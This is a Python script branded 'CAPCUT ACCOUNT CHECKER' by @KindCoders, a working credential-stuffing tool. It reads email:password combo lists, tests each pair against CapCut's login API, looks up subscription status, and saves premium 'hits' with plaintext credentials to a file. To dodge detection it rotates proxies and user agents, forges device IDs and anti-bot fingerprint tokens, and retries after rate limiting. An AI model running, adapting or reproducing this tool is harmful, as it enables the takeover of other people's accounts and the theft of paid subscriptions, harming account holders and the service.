import requests
import json
import time
import random
import re
import sys
import os
from datetime import datetime
from urllib.parse import quote
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BANNER = """
╔══════════════════════════════════════════╗
║     CAPCUT ACCOUNT CHECKER v1.1          ║
║              By: @KindCoders             ║
╚══════════════════════════════════════════╝
"""

PROXIES = []
DEBUG = "--debug" in sys.argv

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:142.0) Gecko/20100101 Firefox/142.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
]

COUNTRY_MAP = {
    "AF": "Afghanistan 🇦🇫", "AL": "Albania 🇦🇱", "DZ": "Algeria 🇩🇿",
    "AR": "Argentina 🇦🇷", "AM": "Armenia 🇦🇲", "AU": "Australia 🇦🇺",
    "AT": "Austria 🇦🇹", "AZ": "Azerbaijan 🇦🇿", "BH": "Bahrain 🇧🇭",
    "BD": "Bangladesh 🇧🇩", "BY": "Belarus 🇧🇾", "BE": "Belgium 🇧🇪",
    "BO": "Bolivia 🇧🇴", "BA": "Bosnia 🇧🇦", "BR": "Brazil 🇧🇷",
    "BG": "Bulgaria 🇧🇬", "KH": "Cambodia 🇰🇭", "CM": "Cameroon 🇨🇲",
    "CA": "Canada 🇨🇦", "CL": "Chile 🇨🇱", "CN": "China 🇨🇳",
    "CO": "Colombia 🇨🇴", "CR": "Costa Rica 🇨🇷", "HR": "Croatia 🇭🇷",
    "CY": "Cyprus 🇨🇾", "CZ": "Czech Republic 🇨🇿", "DK": "Denmark 🇩🇰",
    "DO": "Dominican Republic 🇩🇴", "EC": "Ecuador 🇪🇨", "EG": "Egypt 🇪🇬",
    "EE": "Estonia 🇪🇪", "FI": "Finland 🇫🇮", "FR": "France 🇫🇷",
    "DE": "Germany 🇩🇪", "GR": "Greece 🇬🇷", "GT": "Guatemala 🇬🇹",
    "HK": "Hong Kong 🇭🇰", "HU": "Hungary 🇭🇺", "IN": "India 🇮🇳",
    "ID": "Indonesia 🇮🇩", "IQ": "Iraq 🇮🇶", "IE": "Ireland 🇮🇪",
    "IL": "Israel 🇮🇱", "IT": "Italy 🇮🇹", "JP": "Japan 🇯🇵",
    "JO": "Jordan 🇯🇴", "KZ": "Kazakhstan 🇰🇿", "KE": "Kenya 🇰🇪",
    "KW": "Kuwait 🇰🇼", "LV": "Latvia 🇱🇻", "LB": "Lebanon 🇱🇧",
    "LT": "Lithuania 🇱🇹", "MY": "Malaysia 🇲🇾", "MX": "Mexico 🇲🇽",
    "NL": "Netherlands 🇳🇱", "NZ": "New Zealand 🇳🇿", "NG": "Nigeria 🇳🇬",
    "NO": "Norway 🇳🇴", "PK": "Pakistan 🇵🇰", "PA": "Panama 🇵🇦",
    "PE": "Peru 🇵🇪", "PH": "Philippines 🇵🇭", "PL": "Poland 🇵🇱",
    "PT": "Portugal 🇵🇹", "QA": "Qatar 🇶🇦", "RO": "Romania 🇷🇴",
    "RU": "Russia 🇷🇺", "SA": "Saudi Arabia 🇸🇦", "RS": "Serbia 🇷🇸",
    "SG": "Singapore 🇸🇬", "ZA": "South Africa 🇿🇦", "KR": "South Korea 🇰🇷",
    "ES": "Spain 🇪🇸", "LK": "Sri Lanka 🇱🇰", "SE": "Sweden 🇸🇪",
    "CH": "Switzerland 🇨🇭", "TW": "Taiwan 🇹🇼", "TH": "Thailand 🇹🇭",
    "TR": "Turkey 🇹🇷", "UA": "Ukraine 🇺🇦", "AE": "UAE 🇦🇪",
    "GB": "United Kingdom 🇬🇧", "US": "United States 🇺🇸", "VN": "Vietnam 🇻🇳",
}


# ── Helpers ────────────────────────────────────────────────────────────────

def clear_screen():
    os.system('clear' if os.name != 'nt' else 'cls')


def c(text, color="white"):
    colors = {
        "red": "\033[91m", "green": "\033[92m", "yellow": "\033[93m",
        "blue": "\033[94m", "magenta": "\033[95m", "cyan": "\033[96m",
        "white": "\033[97m", "reset": "\033[0m",
    }
    print(f"{colors.get(color, '')}{text}{colors['reset']}")


def dbg(label, resp=None, extra=None):
    """Print raw API details when --debug flag is active."""
    if not DEBUG:
        return
    sep = "─" * 52
    c(f"\n┌─ DEBUG: {label} {sep[:max(0, 42-len(label))]}", "yellow")
    if resp is not None:
        c(f"│  Status  : {resp.status_code}", "yellow")
        c(f"│  URL     : {resp.url}", "yellow")
        try:
            body = json.dumps(resp.json(), indent=2)
            for line in body.splitlines():
                c(f"│  {line}", "yellow")
        except Exception:
            for line in resp.text.splitlines():
                c(f"│  {line}", "yellow")
    if extra:
        for k, v in extra.items():
            c(f"│  {k}: {v}", "yellow")
    c(f"└{'─' * 52}", "yellow")


def get_proxy_dict():
    if not PROXIES:
        return None
    proxy = random.choice(PROXIES)
    if not proxy.startswith(("http://", "https://", "socks4://", "socks5://")):
        proxy = f"http://{proxy}"
    return {"http": proxy, "https": proxy}


def load_proxies_from_file(filepath):
    try:
        with open(filepath, "r", encoding="utf-8") as f:
            lines = [l.strip() for l in f if l.strip()]
        c(f"✅ Loaded {len(lines)} proxies", "green")
        return lines
    except FileNotFoundError:
        c("Proxy file not found!", "red")
        return []


def format_timestamp(ts):
    try:
        if ts and int(ts) > 0:
            return datetime.fromtimestamp(int(ts)).strftime("%Y-%m-%d")
    except Exception:
        pass
    return "N/A"


def get_days_left(date_str):
    try:
        return (datetime.strptime(date_str, "%Y-%m-%d") - datetime.now()).days
    except Exception:
        return -1


def generate_did():
    return str(random.randint(7_000_000_000_000_000_000, 7_999_999_999_999_999_999))


def fetch_verify_fp(session, ua):
    """Fetch a fresh verifyFp from CapCut's login page — never use a hardcoded one."""
    try:
        resp = session.get(
            "https://www.capcut.com/login",
            headers={"User-Agent": ua},
            timeout=15,
            verify=False,
        )
        dbg("fetch_verify_fp", resp)
        match = re.search(r'verifyFp["\s:=]+["\']+(verify_\w+)["\']', resp.text)
        if match:
            fp = match.group(1)
            dbg("fetch_verify_fp", extra={"Found verifyFp": fp})
            return fp
    except Exception as e:
        dbg("fetch_verify_fp", extra={"Error": str(e)})
    # Fallback: generate a plausible-format token
    h = lambda n: "".join(random.choices("0123456789abcdef", k=n))
    fp = f"verify_{h(8)}_{h(8)}-{h(4)}-{h(4)}-{h(4)}-{h(12)}"
    dbg("fetch_verify_fp", extra={"Fallback fp": fp})
    return fp


# ── Checker ────────────────────────────────────────────────────────────────

class CapCutChecker:
    def __init__(self, email, password, use_proxy=False):
        self.email = email
        self.password = password
        self.use_proxy = use_proxy
        self.session = requests.Session()
        self.ua = random.choice(USER_AGENTS)
        self.csrf_token = ""
        self.cookies = {}
        self.results = {}
        self.store_country = "us"
        self.did = generate_did()
        self.verify_fp = fetch_verify_fp(self.session, self.ua)

    def check(self, attempt=1):
        try:
            dbg("check", extra={"Email": self.email, "DID": self.did, "FP": self.verify_fp, "Attempt": attempt})
            if not self._check_email():
                return {"status": "fail", "reason": "Email not registered"}
            if not self._login():
                return {"status": "fail", "reason": "Login failed"}
            if not self._get_subscription():
                return {"status": "fail", "reason": "Failed to get subscription info"}
            return {"status": "success", **self.results}
        except Exception as e:
            return {"status": "error", "reason": str(e)}

    def _proxies(self):
        return get_proxy_dict() if self.use_proxy else None

    def _check_email(self):
        url = "https://login-row.www.capcut.com/passport/web/user/check_email_registered"
        params = {
            "aid": "348188",
            "account_sdk_source": "web",
            "sdk_version": "2.1.10-tiktok",
            "language": "en",
            "verifyFp": self.verify_fp,
        }
        headers = {
            "User-Agent": self.ua,
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.5",
            "Origin": "https://www.capcut.com",
            "Referer": "https://www.capcut.com/",
            "Content-Type": "application/x-www-form-urlencoded",
        }
        body = f"mix_mode=1&email={quote(self.email)}&fixed_mix_mode=1"
        try:
            resp = self.session.post(url, params=params, headers=headers, data=body,
                                     proxies=self._proxies(), timeout=30, verify=False)
            dbg("check_email", resp)
            if "passport_csrf_token" in self.session.cookies:
                self.csrf_token = self.session.cookies["passport_csrf_token"]
            self.cookies = dict(self.session.cookies)
            try:
                rj = resp.json()
                result = bool(rj.get("data", {}).get("is_registered", 0))
                dbg("check_email", extra={"is_registered": result, "csrf_token": self.csrf_token[:12] + "..." if self.csrf_token else "none"})
                return result
            except Exception:
                return '"is_registered":1' in resp.text
        except Exception as e:
            dbg("check_email", extra={"Exception": str(e)})
            return False

    def _login(self):
        url = "https://login-row.www.capcut.com/passport/web/email/login/"
        params = {
            "aid": "348188",
            "account_sdk_source": "web",
            "sdk_version": "2.1.10-tiktok",
            "language": "en",
            "verifyFp": self.verify_fp,
        }
        headers = {
            "Host": "login-row.www.capcut.com",
            "User-Agent": self.ua,
            "Accept": "application/json, text/javascript",
            "Accept-Language": "en-US,en;q=0.5",
            "X-Tt-Passport-Csrf-Token": self.csrf_token,
            "Appid": "348188",
            "Did": self.did,
            "Store-Country-Code": "ph",
            "Store-Country-Code-Src": "uid",
            "Origin": "https://www.capcut.com",
            "Referer": "https://www.capcut.com/",
            "Content-Type": "application/x-www-form-urlencoded",
        }
        body = (
            f"mix_mode=1&email={quote(self.email)}"
            f"&password={quote(self.password)}&check_region=1&fixed_mix_mode=1"
        )
        try:
            resp = self.session.post(url, params=params, headers=headers, data=body,
                                     proxies=self._proxies(), timeout=30, verify=False)
            dbg("login", resp)
            if "Maximum number of attempts" in resp.text:
                dbg("login", extra={"Result": "RATE LIMITED"})
                return False
            if '"message":"success"' in resp.text:
                self.cookies = dict(self.session.cookies)
                try:
                    rj = resp.json()
                    self.user_id = rj.get("data", {}).get("user_id", "")
                except Exception:
                    pass
                if "store-country-code" in self.cookies:
                    self.store_country = self.cookies["store-country-code"]
                dbg("login", extra={"Result": "SUCCESS", "country": self.store_country})
                return True
            dbg("login", extra={"Result": "FAILED — no success message"})
            return False
        except Exception as e:
            dbg("login", extra={"Exception": str(e)})
            return False

    def _get_subscription(self):
        url = "https://commerce-api-sg.capcut.com/commerce/v1/subscription/user_info"
        cookie_str = "; ".join(f"{k}={v}" for k, v in self.cookies.items())
        headers = {
            "Host": "commerce-api-sg.capcut.com",
            "User-Agent": self.ua,
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.5",
            "Appid": "348188",
            "Loc": self.store_country.upper(),
            "Lan": "en",
            "Pf": "7",
            "Appvr": "12.4.0",
            "Tdid": "",
            "Sign-Ver": "1",
            "App-Sdk-Version": "48.0.0",
            "Device-Time": str(int(time.time())),
            "Did": self.did,
            "Store-Country-Code": self.store_country,
            "Store-Country-Code-Src": "uid",
            "Origin": "https://www.capcut.com",
            "Referer": "https://www.capcut.com/",
            "Content-Type": "application/json",
            "Cookie": cookie_str,
        }
        body = '{"aid":"348188","scene":"vip"}'
        try:
            resp = self.session.post(url, headers=headers, data=body,
                                     proxies=self._proxies(), timeout=30, verify=False)
            dbg("get_subscription", resp)
            if resp.status_code != 200:
                dbg("get_subscription", extra={"Result": f"HTTP {resp.status_code}"})
                return False
            rj = resp.json()

            ret_val = rj.get("ret")
            dbg("get_subscription", extra={"ret": ret_val, "ret_type": type(ret_val).__name__})
            if str(ret_val) != "0":
                return False

            data = rj.get("data", {})
            vip_levels = data.get("vip_levels", [])

            response_data = {}
            try:
                raw = rj.get("response", {})
                response_data = json.loads(raw) if isinstance(raw, str) else (raw or {})
            except Exception:
                pass

            if vip_levels:
                plan = vip_levels[0].get("level", "free").upper()
            elif response_data and response_data.get("flag"):
                plan = response_data.get("level", "VIP").upper()
            else:
                plan = "FREE"

            dbg("get_subscription", extra={
                "plan": plan,
                "vip_levels": vip_levels,
                "end_time": data.get("end_time"),
                "cycle_unit": data.get("cycle_unit"),
            })

            self.results["plan"] = plan
            self.results["billing_cycle"] = data.get("cycle_unit", "N/A")

            end_time = data.get("end_time", 0) or response_data.get("end_time", 0)
            if end_time:
                expiry = format_timestamp(end_time)
                self.results["expiry"] = expiry
                self.results["days_left"] = get_days_left(expiry)
            else:
                self.results["expiry"] = "No Expiry (Free)"
                self.results["days_left"] = "N/A"

            self.results["renewal"] = data.get("subscribe_type", "N/A").upper()

            country_code = self.cookies.get("store-country-code", "US").upper()
            self.results["region"] = country_code
            self.results["country"] = COUNTRY_MAP.get(country_code, country_code)
            return True

        except Exception as e:
            dbg("get_subscription", extra={"Exception": str(e)})
            return False


# ── Output helpers ─────────────────────────────────────────────────────────

def print_result(email, password, result, hit_file, free_file):
    if result["status"] == "success":
        plan = result.get("plan", "FREE")
        days_left = result.get("days_left", "N/A")
        is_premium = plan != "FREE" and isinstance(days_left, int) and days_left > 0

        if is_premium:
            c("\n╔══════ HIT ══════╗", "green")
            c(f"  Email   : {email}", "green")
            c(f"  Pass    : {password}", "green")
            c(f"  Plan    : {plan}", "green")
            c(f"  Expiry  : {result.get('expiry', 'N/A')}", "green")
            c(f"  Days    : {days_left}", "green")
            c(f"  Renewal : {result.get('renewal', 'N/A')}", "green")
            c(f"  Country : {result.get('country', 'Unknown')}", "green")
            c("╚════════════════╝\n", "green")
            if hit_file:
                with open(hit_file, "a", encoding="utf-8") as f:
                    f.write(
                        f"{email}:{password} | Plan: {plan} | Expiry: {result.get('expiry')} "
                        f"| Days: {days_left} | Country: {result.get('country')} "
                        f"| Renewal: {result.get('renewal')}\n"
                    )
        else:
            c(f"  FREE  : {email}", "blue")
            if free_file:
                with open(free_file, "a", encoding="utf-8") as f:
                    f.write(f"{email}:{password} | Country: {result.get('country', 'Unknown')}\n")
    else:
        reason = result.get("reason", "Unknown")
        c(f"  BAD   : {email} — {reason}", "red")


# ── Main ───────────────────────────────────────────────────────────────────

def main():
    clear_screen()
    print(BANNER)

    if DEBUG:
        c("  [DEBUG MODE ON — raw API responses will be shown]\n", "yellow")

    c("Mode:", "cyan")
    print("  1. Single account (no proxy needed)")
    print("  2. Bulk check from TXT file")
    print()

    while True:
        mode = input("  Choice (1/2): ").strip()
        if mode in ("1", "2"):
            break
        c("Enter 1 or 2.", "red")

    accounts = []

    if mode == "1":
        c("\nFormat: email:password", "cyan")
        raw = input("  > ").strip()
        if ":" not in raw:
            c("Invalid format.", "red")
            sys.exit(0)
        accounts.append(raw)
        use_proxy_bool = False
        hit_file = None
        free_file = None
    else:
        c("\nPath to TXT file (email:password per line):", "cyan")
        filepath = input("  > ").strip()
        if not os.path.exists(filepath):
            c(f"File not found: {filepath}", "red")
            sys.exit(0)
        with open(filepath, "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if line and ":" in line and not line.startswith("#"):
                    accounts.append(line)
        if not accounts:
            c("No valid accounts in file.", "red")
            sys.exit(0)

        c("\nUse proxies? (y/n):", "cyan")
        use_proxy_bool = input("  > ").strip().lower() == "y"
        global PROXIES
        PROXIES = []
        if use_proxy_bool:
            proxy_path = input("  Proxy file path: ").strip()
            if proxy_path and os.path.exists(proxy_path):
                PROXIES = load_proxies_from_file(proxy_path)
                if not PROXIES:
                    c("No proxies loaded — using direct connection.", "yellow")
                    use_proxy_bool = False
            else:
                c("Proxy file not found — using direct connection.", "yellow")
                use_proxy_bool = False

        output_dir = "capcut_output"
        os.makedirs(output_dir, exist_ok=True)
        hit_file  = os.path.join(output_dir, "hits.txt")
        free_file = os.path.join(output_dir, "free.txt")

    print()
    c(f"Checking {len(accounts)} account(s)...\n", "cyan")

    stats = {"hits": 0, "free": 0, "bad": 0, "errors": 0}
    lock = threading.Lock()

    def run_check(account):
        try:
            email, password = account.split(":", 1)
        except Exception:
            with lock:
                stats["errors"] += 1
                c(f"  Error: bad format — {account}", "red")
            return

        MAX_RETRIES = 3
        RETRY_DELAYS = [2, 5, 10]  # seconds between each retry
        result = None

        for attempt in range(1, MAX_RETRIES + 1):
            time.sleep(random.uniform(0.3, 1.0))
            result = CapCutChecker(email, password, use_proxy=use_proxy_bool).check(attempt=attempt)

            if result["status"] == "success":
                break

            reason = result.get("reason", "")

            # Don't retry if the email simply isn't registered — it won't change
            if reason == "Email not registered":
                break

            if attempt < MAX_RETRIES:
                delay = RETRY_DELAYS[attempt - 1]
                c(f"  ↻ Attempt {attempt}/{MAX_RETRIES} failed ({reason}) — retrying in {delay}s...", "yellow")
                time.sleep(delay)
            else:
                c(f"  ✗ All {MAX_RETRIES} attempts failed for {email}", "red")

        with lock:
            if result["status"] == "success":
                plan = result.get("plan", "FREE")
                days_left = result.get("days_left", "N/A")
                if plan != "FREE" and isinstance(days_left, int) and days_left > 0:
                    stats["hits"] += 1
                else:
                    stats["free"] += 1
            else:
                stats["bad"] += 1
            print_result(email, password, result, hit_file, free_file)

    workers = 1 if mode == "1" else 3
    with ThreadPoolExecutor(max_workers=workers) as ex:
        futures = [ex.submit(run_check, a) for a in accounts]
        for fut in as_completed(futures):
            pass

    print()
    c("══════════ SUMMARY ══════════", "cyan")
    c(f"  Checked : {len(accounts)}", "white")
    c(f"  Hits    : {stats['hits']}", "green")
    c(f"  Free    : {stats['free']}", "blue")
    c(f"  Bad     : {stats['bad']}", "red")
    c(f"  Errors  : {stats['errors']}", "yellow")
    if mode == "2":
        c(f"  Saved to: capcut_output/", "white")
    print()
    c("🔥 @KindCoders 🔥", "magenta")
    print()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\nStopped.")
        sys.exit(0)
